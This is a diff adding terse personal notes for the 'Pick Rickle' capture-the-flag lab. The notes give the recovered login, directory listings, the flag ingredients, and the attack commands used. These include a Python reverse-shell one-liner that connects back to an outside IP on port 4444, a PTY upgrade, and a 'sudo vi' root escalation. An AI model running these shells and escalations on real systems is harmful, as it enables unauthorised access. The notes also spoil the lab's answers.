@@ -1,0 +1,57 @@
+BEWARE SPOILERS
+
+cat picklerick_walkthrough.txt 
+Username: R1ckRul3s
+robots.txt(password): Wubbalubbadubdub
+
+http://10.10.192.174/login.php
+
+ls-al
+total 40
+drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
+drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
+-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
+drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
+-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
+-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
+-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
+-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
+-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
+-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
+
+grep -v * Sup3rS3cretPickl3Ingred.txt
+
+"so when we ls -la we notice that there are two files Sup3rwhatever.txt and clue.txt let's try and open them in the browser." damn.
+
+mr. meeseek hair
+
+/home/rick/second ingredients
+
+-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
+/home/rick/second ingredients:1 jerry tear
+
+pwd
+/var/www/html
+
+grep -v ../../../*
+Binary file ../../../initrd.img matches
+
+-rwxr-xr-x  1 root   root       14680 Nov  7  2018 msgexec
+-rwxr-xr-x  1 root   root       27048 Nov  7  2018 msgfilter
+-rwxr-xr-x  1 root   root       77104 Nov  7  2018 msgfmt
+-rwxr-xr-x  1 root   root       35520 Nov  7  2018 msggrep
+-rwxr-xr-x  1 root   root       44104 Nov  7  2018 msginit
+-rwxr-xr-x  1 root   root       52520 Nov  7  2018 msgmerge
+-rwxr-xr-x  1 root   root       31256 Nov  7  2018 msgunfmt
+-rwxr-xr-x  1 root   root       18752 Nov  7  2018 msguniq
+lrwxrwxrwx  1 root   root          24 Nov 14  2018 locate -> /etc/alternatives/locate
+lrwxrwxrwx  1 root   root          21 Nov 14  2018 vim -> /etc/alternatives/vim
+lrwxrwxrwx  1 root   root          31 Mar 23  2016 py3versions -> ../share/python3/py3versions.py
+-rwxr-xr-x  2 root   root     1907192 Jun 12  2018 perl
+lrwxrwxrwx  1 root   root          21 Feb 10  2019 php -> /etc/alternatives/php
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.38.70",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+sudo vi -c '!bash'
+
+"To spawn the root shell i used the sudo su command, and then went to the root folder to get the third flag." 
